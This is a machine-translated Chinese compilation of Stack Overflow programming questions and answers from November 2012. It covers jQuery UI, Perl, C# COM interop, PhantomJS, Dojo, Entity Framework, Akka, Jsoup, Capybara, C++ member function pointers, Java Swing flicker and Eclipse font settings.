# StackOverflow 问答 13572000-13572999

# jquery-ui - 如何减小文本框中日期选择器的大小？

> ID：13572000
> 
> 赞同：0
> 
> 时间：2012-11-26T19:47:33.903
> 
> 标签：jquery-ui

我已经能够在文本框中使用日期选择器，但我无法弄清楚减少它的默认大小？？任何帮助表示赞赏。谢谢我提前

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T19:52:52.707

您需要更改字体大小以使其变小，如下所示：

```
.ui-datepicker {
  font-size: .8em; /* put small value here*/
} 
```

查看[**示例**](http://jsfiddle.net/yCSM3/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T19:54:07.923

如果我没记错的话：

```
input.ui-datepicker{
 font-size:10px;
} 
```

# perl - perl 5.8 和 5.10 的区别

> ID：13572003
> 
> 赞同：-4
> 
> 时间：2012-11-26T19:47:44.597
> 
> 标签：perl, perl5.10, perl5.8

我正在编译一些与 5.8 和 5.10 之间的差异相关的信息。有人可以指出主要区别，或者告诉我可以从哪里开始我的研究吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T19:57:18.657

[`perldoc perl5100delta`](http://search.cpan.org/perldoc?perl5100delta)

> 姓名
> 
> perl5100delta - perl 5.10.0 的新功能
> 
> 描述
> 
> 本文档描述了 5.8.8 版本和 5.10.0 版本之间的差异。...

Perl v5.10.1 中引入的重要更改可以在[`perl5101delta`](http://search.cpan.org/perldoc?perl5101delta)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T19:48:58.087

这可能是一个很好的起点：[http ://dev.perl.org/perl5/news/2007/perl-5.10.0.html](http://dev.perl.org/perl5/news/2007/perl-5.10.0.html)

# c# - 应该按什么顺序释放 COM 对象和垃圾收集？

> ID：13572004
> 
> 赞同：6
> 
> 时间：2012-11-26T19:47:45.293
> 
> 标签：c#, com, garbage-collection

SO上有很多关于释放COM对象和垃圾收集的问题，但我找不到专门解决这个问题的问题。

释放 COM 对象（在这种情况下特别是 Excel 互操作）时，我应该按什么顺序释放引用并调用垃圾回收？

在某些地方（例如[这里](https://stackoverflow.com/a/1893653/976080)）我看到了这个：

```
Marshall.FinalReleaseComObject(obj);
GC.Collect();
GC.WaitForPendingFinalizers(); 
```

在其他（例如[这里](https://stackoverflow.com/a/159419/976080)）中：

```
GC.Collect();
GC.WaitForPendingFinalizers();
Marshall.FinalReleaseComObject(obj); 
```

还是没关系，我什么都不担心？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:24:35.803

Marshal.FinalReleaseComObject() releases the underlying COM interface pointer.

GC.Collect() and GC.WaitForPendingFinalizers() causes the finalizer for a COM wrapper to be called, which calls FinalReleaseComObject().

So what makes no sense is to do it *both* ways. Pick one or the other.

The trouble with explicitly calling FinalReleaseComObject() is that it will only work when you call it for **all** the interface pointers. The Office program will keep running if you miss just one of them. That's *very* easy to do, especially the syntax sugar allowed in C# version 4 makes it likely. An expression like `range = sheet.Cells[1, 1]`, very common in Excel interop code. There's a hidden Range interface reference there that you never explicitly store anywhere. So you can't release it either.

That's not a problem with GC.Collect(), it can see them. It is however not entirely without trouble either, it will only collect and run the finalizer when your program has no reference to the interface anymore. Which is definitely what's wrong with your second snippet. And which tends to go wrong when you debug your program, the debugger extends the lifetime of local object references to the end of the method. Also the time you look at Taskmgr and yell "die dammit!"

The usual advice for GC.Collect() applies here as well. Keep your program running and perform work. The normal thing happens, you'll trigger a garbage collection and that releases the COM wrappers as well. And the Office program will exit. It just doesn't happen instantly, it will happen eventually.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T19:58:38.970

COM 使用的引用计数机制是另一种自动内存管理方式，但对内存和行为的影响略有不同。

任何引用计数实现都为资源清理提供确定性行为。这意味着在调用`Marshal.FinalReleaseComObject()`与 COM 对象相关的所有资源（内存和其他资源）之后，将立即回收。

这意味着如果我们有额外的托管对象并且您想尽快回收它们，您应该首先释放 COM 对象，并且仅在该调用`GC.Collect`方法之后。

# php - 检测网页是否有 javascript 重定向

> ID：13572007
> 
> 赞同：7
> 
> 时间：2012-11-26T19:47:49.777
> 
> 标签：php, javascript, curl

我正在使用 cURL 访问许多不同的页面。我想要一种优雅的方式来检查页面是否有 javascript 重定向。我可以检查`window.location`正文中是否存在 a，但因为它可能位于 .js 文件中或使用 jQuery 之类的库，所以似乎任何解决方案都不完美。有人有想法么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T15:11:10.343

感谢 Ikstar 指出 phantomjs，我制定了以下示例：

**测试.js**

```
var page = require('webpage').create();
var testUrls = [
    "http://www.google.nl",
    "http://www.example.com"
];

function testNextUrl()
{
    var testUrl = testUrls.shift();
    page.open(testUrl, function() {
        var hasRedirect = page.url.indexOf(testUrl) !== 0;
        console.log(testUrl + ": " + hasRedirect.toString());
        if (testUrls.length) {
            testNextUrl();
        } else {
            phantom.exit();
        }
    });
}

testNextUrl(); 
```

**结果：**

```
D:\Tools\phantomjs-1.7.0-windows>phantomjs test.js
http://www.google.nl: false
http://www.example.com: true 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:08:07.523

您不能仅通过解析脚本来做到这一点。只有执行才会显示页面JS的真实流程。

模仿执行的一种方法是具有具有重定向的不同级别的代码级别。最上面的将在`<script>`标签下，这里的任何重定向都是直接重定向。如果在函数中发现任何重定向，那么您必须跟踪程序的结构并进行猜测。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T21:17:07.997

根据使用 Curl 的目的和实际需要在页面上进行重定向。可以合并像 PhantomJS (http://phantomjs.org/) 这样的无头框架来进行必要的浏览。您将能够查看是否会发生重定向以及跟踪页面上执行的任何其他 javascript。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-10-09T20:27:50.297

仅仅分析网页源代码是**不可能**检测到重定向的。

不可判定的[停机问题](https://en.wikipedia.org/wiki/Halting_problem)可以用 JavaScript 编码。该算法可能会停止，从而导致生成重定向，或者永远运行。由于我们不知道代码是否会停止，因此也不可能决定是否执行重定向。

# perl - 如何在 Perl 中拦截 HTTP 请求？

> ID：13572009
> 
> 赞同：1
> 
> 时间：2012-11-26T19:47:59.570
> 
> 标签：perl, http, httprequest

我正在开发一个 Web 应用程序，我想知道是否有一种方法或某种模块可以在显示给客户端之前拦截或处理任何 HTTP 请求。我无法修改 httpd.conf 文件，所以它不是一个选项。我想通过拒绝访问或重定向到其他页面或修改发送给客户端的响应和其他一些东西来为我的 Web 应用程序添加一些安全性。我也听说过请求调度，也许它可以帮助我。有人知道如何实现这一目标吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T21:40:28.577

也许您可以使用[Plack::Handler::Apache2](https://metacpan.org/module/Plack%3a%3aHandler%3a%3aApache2)来启用 PSGI 支持。从那里，您可以使用 PSGI 中间件模块来修改请求和响应。

如果不知道如何设置 Perl 以在 mod_perl 环境中执行，就很难得到更具体的信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:11:38.613

您可能想查看[HTTP::Proxy](http://search.cpan.org/~book/HTTP-Proxy-0.25/lib/HTTP/Proxy.pm)，这是一个用于编写 Web 代理的[perl](http://perl.cpan.org)模块......一个例子：

```
 # alternate initialisation
  my $proxy = HTTP::Proxy->new;
  $proxy->port( 3128 ); # the classical accessors are here!

  # this is a MainLoop-like method
  $proxy->start;
  my $d = HTTP::Daemon->new || die;
  while (my $c = $d->accept) {
      while (my $r = $c->get_request) {
          if ($r->method eq 'GET' and $r->uri->path eq "/xyzzy") {
              # remember, this is *not* recommended practice :-)
              $c->send_file_response("/home/hd1/.zshrc");
          }
          else {
              $c->send_error(RC_FORBIDDEN)
          }
      }
      $c->close;
      undef($c);
  } 
```

# vb.net - VB中鼠标离开texbox时如何恢复值？

> ID：13572015
> 
> 赞同：0
> 
> 时间：2012-11-26T19:48:54.707
> 
> 标签：vb.net, textbox, click, mouseevent

我的文本框的默认值为“0,00”。我的代码在单击时清除文本框。

```
 Private Sub Pop1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Pop1.MouseDown
    Pop1.Text = ""

End Sub 
```

现在我想制作一个代码，如果在离开文本框时 texbox 留空 - 单击其他项目，则将默认值 (0,00) 放回原处。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T19:57:26.960

您可以处理文本框的离开事件，如果它为空，则将其设置回默认值。

```
Private Sub TextBox1_Leave(sender As Object, e As System.EventArgs) Handles TextBox1.Leave
    If Me.TextBox1.Text.Equals(String.Empty) Then
        Me.TextBox1.Text = "0,00"
    End If
End Sub 
```

# .htaccess - 为什么在每个目录中都使用 .htaccess？

> ID：13572020
> 
> 赞同：0
> 
> 时间：2012-11-26T19:49:09.467
> 
> 标签：.htaccess, netbeans

在查看 NetBeans 附带的 TodoList 示例时，我注意到它们`.htaccess`在每个目录中都有相同的文件。为什么要采用这种方法，而不是将所有内容放在一个目录中，其中一个`.htaccess`包含所有包含的子目录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:15:00.777

这取决于方法。如果您有一个单一的站点，因为所有内容或多或少都在一个地方，那么在您的文档根目录中拥有一个单独的 htaccess 文件可能是最好的方法。当您的站点是模块化的或每个目录都是其自己的“webapp”时，在每个目录中都有 htaccess 文件意味着您可以移动它们，将它们放在其他文件夹中，或者根据需要组织它们而不必担心关于更改文档根目录中单个 htaccess 文件中的内容。这使得它更便携，但如果您的网站是这样设计的，您只会真正关心这一点。

# dojo - 尝试使用 Dojo 创建图表

> ID：13572022
> 
> 赞同：0
> 
> 时间：2012-11-26T19:49:10.723
> 
> 标签：dojo

我正在尝试使用 Dojo 1.8.1 创建图表，但浏览器窗口中没有显示任何内容（我使用的是 IE 8）。

这是我到目前为止所拥有的：

```
<html>
<head>
    <title>Dojo Charting Example</title>
    <script src="http://ajax.googleapis.com/ajax/libs/dojo/1.8.1/dojo/dojo.js"></script>
    <script>
        require(["dojox/charting/Chart", "dojox/charting/axis2d/Default", "dojox/charting/plot2d/Lines", "dojo/ready"],
            function(Chart, Default, Lines, ready) {
            ready(function() {
                var chart1 = new dojox.charting.Chart2D("simplechart");
                chart1.addPlot("default", {type: Lines});
                chart1.addAxis("x");
                chart1.addAxis("y", {vertical: true});
                chart1.addSeries("Series 1", [1, 2, 2, 3, 4, 5, 5, 7]);
                chart1.render();
            });
        });
    </script>
</head>

<body>
    <div id="simplechart" style="width: 250px; height: 150px; margin: 5px auto 0px auto;"></div>
</body> 
```

以下是我从 JavaScript 错误消息中得到的信息：

```
Webpage error details

User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; chromeframe/23.0.1271.64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.2; MS-RTC LM 8; .NET4.0E)
Timestamp: Mon, 26 Nov 2012 20:03:05 UTC

Message: Object expected
Line: 9
Char: 6
Code: 0
URI: http://localhost:8084/ReferenceManager/dojoChartingExample2.html

Message: Object doesn't support this property or method
Line: 2
Char: 1
Code: 0
URI: http://ajax.googleapis.com/ajax/libs/dojo/1.8.1/dojox//charting/plot2d/Base.js 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T03:12:26.360

The important thing is `new dojox.charting.Chart2D`.

You have to change to `new Chart` [[More info]](http://dojotoolkit.org/documentation/tutorials/1.8/modern_dojo/)

**Chart** is come from `function(Chart, Default, Lines, ready)` that was required by you.

[Here is an example.](http://jsfiddle.net/oamiamgod/bmLGx/)

# c# - 带有 EntityFramework 的表数据网关

> ID：13572026
> 
> 赞同：-1
> 
> 时间：2012-11-26T19:49:19.217
> 
> 标签：c#, entity-framework, design-patterns

我对模式表数据网关有疑问...我正在创建一个小项目，只是为了我的目的，我想实现表数据网关模式。是否可以使用 EntityFramework 为这种模式创建数据操作方法，如插入、更新、删除？并使用数据上下文连接到数据库？

谢谢 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T19:58:04.897

表数据网关模式的目的是让开发人员不必直接编写 SQL，还允许集中 SQL 代码，以便 DBA 可以轻松维护它。

这样，Entity Framework 对此至少有 50% 的有效性。使用实体框架，开发人员不必编写 SQL 代码，因此您可以避免开发人员不知道如何编写 SQL 代码的问题。

至于集中 SQL 代码以方便 DBA 管理，您可以使用 Entity Framework 实现存储过程，从而可以提供插入、更新和删除方法，我相信这将满足其余要求。

[这](http://msdn.microsoft.com/en-us/data/gg699321.aspx)是 Julie Lerman 的一篇文章，其中包含视频和文本内容，告诉您如何为 CRUD 映射存储过程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T13:49:34.787

在 Fowler 的[POEE](http://martinfowler.com/eaaCatalog/tableDataGateway.html)中的表数据网关示例中，您将看到他在代码中进行了显式 SQL 调用并返回了记录或数据集。例如：

```
public IDataReader FindWithLastName(String lastName) {
     String sql = "SELECT * FROM person WHERE lastname = ?"; 
```

由于实体框架抽象为您工作，我认为如果您引用 EF 实体，您并没有真正使用该模式。也就是说，您问是否*可以*这样做，当然答案是肯定的。这似乎更像是一个你想在实现模式时有多“纯粹”的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T19:57:18.677

MSDN 对此有一个教程：[EF Designer CUD Specs](http://msdn.microsoft.com/en-us/data/jj593489)

# playframework - 如何将 akka in play framework 2.1 rc1 配置为生产？

> ID：13572028
> 
> 赞同：1
> 
> 时间：2012-11-26T19:49:20.887
> 
> 标签：playframework, playframework-2.0, akka

我正在使用带有网络套接字的播放框架 2.1 RC1。

对网络套接字的每个请求我都会在 Akka.system 上打开最多 4 个 akka 作业，

我有负载测试器，它打开 1000 个连接并发送使用 4 个 akka 作业的请求，它工作得很慢但是当我看到 CPU% 和内存它没有达到限制并且响应发送串行所以我认为 akka 配置是错误的. 这是我在 conf/application.conf 中的 akka 配置：

```
play {

akka {

    actor {

        deployment {

            /actions {
                router = round-robin
                nr-of-instances = 1000
            }

            /promises {
                router = round-robin
                nr-of-instances = 1000
            }

        }

        retrieveBodyParserTimeout = 60 seconds

        actions-dispatcher = {
            fork-join-executor {
                parallelism-factor = 1000
                parallelism-max = 1000
                pool-size-max =1000
            }
        }

        promises-dispatcher = {
            fork-join-executor {
                parallelism-factor = 1000
                parallelism-max = 1000
                pool-size-max =1000
            }
        }

    }

} 
```

}

# sharepoint - 在 SharePoint2010 上自定义 WebTaggingDialog.JS 文件

> ID：13572029
> 
> 赞同：1
> 
> 时间：2012-11-26T19:49:36.737
> 
> 标签：sharepoint, sharepoint-2010

当我打开编辑 SharePoint2010 对象元数据的对话框时，我看到网页加载了各种 JavaScript 文件。其中之一是`WebTaggingDialog.JS`。我需要在这个 JavaScript 文件中自定义函数。

1.  有人知道这是否是来自服务器某处的静态文件吗？
2.  是否有任何 SharePoint 功能强制动态生成此文件和/或影响其内容？

任何人都可以确认这根本不可能吗？

# android - Jsoup解析html

> ID：13572031
> 
> 赞同：0
> 
> 时间：2012-11-26T19:49:47.300
> 
> 标签：android, jsoup

我有以下情况：

```
<div class="a">
  <div class="b">
    <ul class="c d">
      <ul data-category="Z">
           <...some informations/>
      </ul>
      <ul data-category="G">
           <..some informations/>
      </ul>
   </ul>
  </div>
</div> 
```

我需要存储按数据类别包含的值以及每个 ul 数据类别包含的所有内容。如何解析这个？我做了：

```
String string_r=null;
Elements elems = doc.select("div.b");
for (Element div:elems){
   Elements div1 = div.select("ul.b c");
   for (Element vall1:div1){
      string_r=vall1.text();
   }
} 
```

如果我在第一个 for 之后打印文本值，我会收到一个巨大的文本，其中包含找到 div.b 的所有内容。但在这种情况下，字符串为空。有人可以帮忙吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:52:44.480

你可以试试这个 tuts，它可能会帮助你理解解析 HTML[点击这里](http://jsoup.org/cookbook/extracting-data/example-list-links)

[解析 DIV](https://stackoverflow.com/questions/12539647/jsoup-parsing-html-get-class-inside-class)

# ruby-on-rails-3 - Rails Phantomjs、poltergeist 和 Capybara 不能很好地配合

> ID：13572034
> 
> 赞同：8
> 
> 时间：2012-11-26T19:49:52.070
> 
> 标签：ruby-on-rails-3, capybara, rspec-rails, phantomjs, poltergeist

在 rails 3.1.2 项目（mac OS X）中工作，我正确安装了 PhantomJS（我可以运行如下代码，它运行*良好*，准确地抓取页面标题并保存准确的屏幕截图）

**try_phantom.coffee**

```
page = require('webpage').create()
page.open 'http://localhost:5000/parties/onetestparty', (status) ->
    title = page.evaluate -> document.title
    console.log "Title: #{title}"
    page.render './log/javascript_screenshot.png'
    phantom.exit() 
```

但是，当我尝试在 rspec 中使用 capybara/poltergeist 时，如下所示：

**spec_helper.rb**

```
require 'capybara/poltergeist'
Capybara.javascript_driver = :poltergeist 
```

然后使用需要javascript的调用规范：

**缔约方规范.rb**

```
 it "should allow a simple screenshot", js: true do
            visit "/"
            page.driver.render('./log/screen_Home.png', :full => true)
        end 
```

我的javascript似乎没有被渲染，而且截图**总是**空白！

我已经尝试过调试器，但这似乎也带来了一个空白的 HTML 页面（只是带有空头和正文标签的 html）

我很确定问题出在 capybara 和 poltergeist 或（更有可能）poltergeist 和 phantomjs 之间的接口。以下是相关 gem 的版本：

> capybara 1.1.3 capybara
> -webkit 0.13.0
> poltergeist 1.0.2
> phantomjs 是 1.7.0

不知道如何进一步排除故障......任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-27T14:43:13.863

创建一个非常简单的测试，看看会发生什么。

simple_spec.rb

```
require 'spec_helper'
require 'capybara/poltergeist'
include Capybara::DSL
Capybara.javascript_driver = :poltergeist

describe 'some stuff which requires js', :js => true do
  it 'will take a screenshot' do
    visit("http://google.com")
    page.driver.render('./file.png', :full => true)
  end
end 
```

这会让你得到谷歌的形象吗？

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-05T11:00:49.807

我有同样的问题，但在我的情况下，它是由使用子域引起的。Poltergeist 被指向无意义的 url（类似于“http://spb.:22789”），因此它只收到“about:blank”。

为了解决这个问题，我做了以下事情：

1.  为 Capybara 设置 app_host 和 server_port

    Capybara.app_host = 'http://city.tulp.test:3003' Capybara.server_port
    = 3003

2.  将虚拟域添加到 /etc/hosts

希望这可以帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-26T22:02:09.070

如果您注册驱动程序可能会有所帮助？

```
Capybara.register_driver :poltergeist do |app|
  Capybara::Poltergeist::Driver.new(app, {debug: false})
end
Capybara.current_driver = :poltergeist # NOTE THE CURRENT_DRIVER, NOT JAVASCRIPT_DRIVER! 
```

# ios - 在不使用 gps 的情况下测量 iphone 行驶的距离

> ID：13572039
> 
> 赞同：0
> 
> 时间：2012-11-26T19:50:04.703
> 
> 标签：ios, accelerometer, gyroscope

> **可能重复：**
> [需要使用 Gyro+Accelerometer](https://stackoverflow.com/questions/6647314/need-to-find-distance-using-gyroaccelerometer)
> [Android 加速度计精度（惯性导航）查找距离](https://stackoverflow.com/questions/7829097/android-accelerometer-accuracy-inertial-navigation)

我正在开发一个测量移动距离的iOS应用程序，例如，打开应用程序后可以将iPhone放在口袋里，然后应该能够获得他乘坐的车辆行驶的距离，或者如果他是走路，跑步等。我希望它足够准确，以便人们可以移动放置在桌子上的设备，比如一英尺，应用程序会告诉你这个小距离甚至移动了。我不想使用 GPS，而只想使用陀螺仪和加速度计。到目前为止，我的想法是定期从陀螺仪和加速度计数据中获取设备沿其三个轴旋转的角度，然后使用此信息来计算沿用户所在轴的移动幅度正在移动，使用加速度计。这看起来像是一种可行的方法吗？还，

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-26T19:53:13.647

是的，这可以工作，至少对于更小的距离。使用 GPS 你会更成功。

加速度计是更复杂的数学。记住一篇科学论文，但实施起来并不容易。

# c++ - 初始化中的指针转换

> ID：13572044
> 
> 赞同：0
> 
> 时间：2012-11-26T19:50:43.573
> 
> 标签：c++, qt, casting

我有一个类`MyClass`，其中有一个函数返回指向`QString`：

```
QString* MyClass::generateName() 
```

在其他函数中，我想在其中创建一个函数指针数组`generateName()`。当我写

```
QString* (*array[1])() = {&MyClass::generateName}; 
```

我收到一个错误：

```
cannot convert ‘QString* (MyClass::*)()’ to ‘QString* (*)()’ in initialization 
```

当我`MyClass::`从数组定义中删除时，它只会给我另一个关于 ISO 的错误。此外，前一个错误仍然存​​在。

我应该怎么做才能摆脱错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T19:58:59.517

首先使用函数指针，您应该使用 typedef：

```
typedef QString* (MyClass::* funcType)(); 
```

然后，很容易定义一个数组：

```
funcType myArray[] = { &MyClass::generateName }; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T19:58:27.550

您正在寻找定义成员函数指针数组的语法是：

```
QString* (MyClass::*array[1])() = {&MyClass::generateName}; 
```

与普通函数指针的唯一区别是，对于成员函数指针，您必须在类型中给出类名：

```
ReturnType* (ClassType::*)(ArgTypes) 
```

# javascript - 交互式逻辑树，从本地主机移动到在线可访问

> ID：13572045
> 
> 赞同：1
> 
> 时间：2012-11-26T19:50:48.997
> 
> 标签：javascript, web, localhost, dyndns

我的名字是 Josie，我正在为一个小组创建一个逻辑树流程。

我有一个程序并创建了这个交互式逻辑树，它目前在我的本地主机上运行（例如 http://localhost/eSample.html）。我想以某种方式让其他人/计算机可以访问这个“网站”，但我不知道该怎么做，我发现的解释似乎给我留下了更多问题。我使用过的动态 DNS 和端口 80 之类的东西（并按照这些说明[http://thetechnofreak.com/technofreak/localhost-online-apache/](http://thetechnofreak.com/technofreak/localhost-online-apache/)完成）。但是一旦我完成了所有这些步骤（我已经完成了），然后呢？

它似乎也包含在一个 javascript 文件中，我尝试使用该文件以便在现有网站中操作此逻辑树。那是使用表达式引擎。

我似乎无法弄清楚这到底是如何工作的......尽管我已经阅读了许多说明，但我希望有人能够帮助我连接这些点。

# xml - Eclipse中的xml问题

> ID：13572046
> 
> 赞同：1
> 
> 时间：2012-11-26T19:50:50.150
> 
> 标签：xml, eclipse

我的 r.java 在 Eclipse 中消失了，我知道这是由于我的 xml 中有一个错误。我是新手，所以我自己不知道以下编码有什么问题，我主要只是在互联网上关注教程。感谢任何可以提供帮助的人。

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".Main" />

-     <TextView
-         android:id="@+id/textView1"
-         android:layout_width="wrap_content"
-         android:layout_height="wrap_content"
-         android:layout_centerHorizontal="true"
-         android:layout_centerVertical="true" />
-
    <Button
        android:id="@+id/st"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:text="Start Test"
        android:layout_above="@+id/textView1"
        android:textStyle="bold|italic"
/>

    <LinearLayout
        android:id="@+id/linearLayout1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentLeft="true"
        android:gravity="center_vertical|center"
        android:orientation="vertical"
        android:weightSum="1" >

        <Button
            android:id="@+id/drinkcounter"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Unit Counter" />

        <Button
            android:id="@+id/drinklist"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Drink List" />

        <Button
            android:id="@+id/drinkdrivinglimit"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Drink Driving Limits" />

        <Button
            android:id="@+id/datarecord"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:text="Data Records" />
    </LinearLayout>

</RelativeLayout> 
```

# java - Java：如何避免仅在形状制作的动画（无图像文件）上闪烁？

> ID：13572047
> 
> 赞同：3
> 
> 时间：2012-11-26T19:50:50.157
> 
> 标签：java, awt, shape, drawimage

嗨，我正在阅读 Ian Cinnamon 的《为邪恶天才编程视频游戏》一书。在其中一个项目中，他解释了如何为赛车游戏创建一些动画。我在下面写了一个简单的代码（删除“几乎”所有不必要的东西）。但结果是一样的：**闪烁的**.

我的问题是，如何**通过使用相同的代码**（显然几乎没有修改）让它停止闪烁？我的意思**不是找到另一种方法**（修改整个代码），因为我已经能够使用**JLabel**、**ImageIcon**类和 spritesheets 图像文件创建整个游戏。我的观点是在不移除这些形状的情况下解决闪烁问题 [ **Rectangle** (fillRect & if possible drawImage)]。

顺便说一句，如果这是不可能的“你为什么要那样做！？” 或“不可能”也是很好的答案。（让我们尽量不要使用它们！）

谢谢你！

```
import java.awt.*;
import javax.swing.*;
import java.io.*;
import java.net.*;

public class Race extends JFrame {
    public static void main(String[] args){
        new Race();
    }
        private Rectangle r1 = new Rectangle(0,0,800,100);
        private Rectangle r2 = new Rectangle(0,100,100,400);
        Image img = null;

    public Race(){
        super("Some Title");
        setVisible(true);
        setSize(800,600);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        try{
             URL url= this.getClass().getResource("someImage.png");
            img =Toolkit.getDefaultToolkit().getImage(url);
        }catch(Exception e){}
        Race.GameLoop gameHeart = new Race.GameLoop();
        gameHeart.run();
    }

    public void paint(Graphics g){
        super.paint(g);
        g.setColor(Color.GREEN);
        g.fillRect(r1.x, r1.y, r1.width, r1.height);
        g.setColor(Color.RED);
        g.fillRect(r2.x, r2.y, r2.width, r2.height);
        g.drawImage(img, r2.x, r2.y, r2.width, r2.height, this);
        try {
            Thread.sleep(75);
        } catch (InterruptedException ex) {}
        repaint();
    }

    public class GameLoop extends Thread {
        public void run(){
            while(true){
                //game animations and logic
                //even if I put repaint() here it still flicker
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:00:29.077

不要在顶级容器（如`JFrame`）上绘制，它们不支持双缓冲。

相反，使用类似的东西`JPanel`

约定更喜欢覆盖`paintComponent`而不是`paint`. 这样做主要是因为`paint`实际上是一种非常复杂的方法

**切勿**以任何`paint`方式这样做：

```
try {
    Thread.sleep(75);
} catch (InterruptedException ex) {}
repaint(); 
```

首先，任何延迟都应该由游戏线程处理，`Thread#sleep`在paint方法中调用将使事件调度线程进入睡眠状态，这将阻止它发布事件（关于鼠标和键盘交互）并使你的程序看起来没有响应，这将导致您以后出现问题。

永远不要从绘画方法内部调用`repaint`（或任何可能调用`repaint`的方法）。这只是要求重绘管理器安排另一个绘制周期，这将占用您的 CPU 直到您的程序变得无响应。同样，这是您的游戏线程的功能。

请记住，Swing**不是**线程保存。与 UI 的所有交互都必须在事件调度线程的上下文中进行。阅读[Swing 中的并发以](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)获取更多信息

你可以看看[如何使线条动画更平滑？](https://stackoverflow.com/questions/13540534/how-to-make-line-animation-smoother/13547895#13547895)和[Java 弹跳球](https://stackoverflow.com/questions/13022754/java-bouncing-ball/13022788#13022788)作为示例

您可能想阅读[在 AWT 和 Swing 中](http://www.oracle.com/technetwork/java/painting-140037.html)[执行自定义绘画](http://docs.oracle.com/javase/tutorial/uiswing/painting/)和绘画

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T07:33:53.417

**这是一个快速的答案**（如果您太懒或没有时间阅读 MadProgrammer 和垃圾神在答案中给出的文档，顺便帮我写这个）。**但我强烈建议您一有空闲时间就阅读文档。**

这是重新编写的问题中的代码，因此不会闪烁。我将代码分为两个类：在 GameFrame 类中包含游戏的 JFrame 和在扩展 JPanel 的 Race 类中的赛车游戏本身（如问题中的一部分）。

**GameFrame.java**

```
import javax.swing.*;

public class GameFrame extends JFrame {

    public static void main(String args[]){
        new GameFrame();
    }

    public GameFrame(){
        super("Graphics with JFrame");
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setSize(800,600);
        Race game = new Race();
        this.getContentPane().add(game);
        this.setVisible(true);
        game.run();
    }

} 
```

**种族.java**

```
import java.awt.*;
import javax.swing.*;
import java.io.*;
import java.net.*;

public class Race extends JPanel implements Runnable {

    private Rectangle r1 = new Rectangle(0,0,800,100);
    private Rectangle r2 = new Rectangle(0,100,100,400);
    Image img = null;

    public Race(){
        try{
             URL url= this.getClass().getResource("someImage.png");
            img =Toolkit.getDefaultToolkit().getImage(url);
        }catch(Exception e){}
    }

    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        g.setColor(Color.GREEN);
        g.fillRect(r1.x, r1.y, r1.width, r1.height);
        g.setColor(Color.RED);
        g.fillRect(r2.x, r2.y, r2.width, r2.height);
        g.drawImage(img, r2.x, r2.y, r2.width, r2.height, this);
}

    public void run() {
        while(true){
            try {
                Thread.sleep(75);
            } catch (InterruptedException ex) {}
            repaint();

            //game animations and logic
        }
    }
} 
```

再次感谢 MadProgrammer 和垃圾神。很抱歉，我回答了我的问题而不是评论其他人的问题，但我必须明确表明之前和之后之间的区别。同样，如果您不明白我为什么要进行这些修改以避免闪烁。阅读 MadProgrammer 和垃圾神评论和答案。

# java - 在 Eclipse 的控制台输出中放大字体大小

> ID：13572049
> 
> 赞同：25
> 
> 时间：2012-11-26T19:50:57.260
> 
> 标签：java, eclipse, fonts

有没有办法在 Eclipse IDE 的控制台输出中只放大部分字体？我创建了一个简短的程序，使用哈希映射将字母表转换为等效的盲文，但它太小了，几乎无法阅读。
我进入了 Preferences -> General -> Colors and Fonts -> Basic -> Text Font 并从那里进行了编辑，但这会增加所有内容的大小。
我可以增加部分文本的大小吗？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-11-26T20:49:52.773

